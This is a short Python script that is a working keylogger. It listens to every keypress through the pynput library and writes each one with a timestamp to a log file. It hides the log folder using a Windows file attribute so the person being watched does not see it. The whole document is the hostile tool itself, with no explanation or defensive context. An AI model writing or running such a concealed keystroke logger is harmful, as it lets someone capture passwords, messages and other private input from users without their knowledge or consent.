from pynput import keyboard
import logging
import os
import ctypes

path = ".keylogger"
FILE_ATTRIBUTE_HIDDEN = 0x02

if not os.path.exists(path):
    os.mkdir(".keylogger")
    ctypes.windll.kernel32.SetFileAttributesW(path, FILE_ATTRIBUTE_HIDDEN)

logging.basicConfig(filename=(".keylogger/logs.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")

def keyPressed(key):
    logging.info(str(key))

with keyboard.Listener(on_press=keyPressed) as listener:
    listener.join()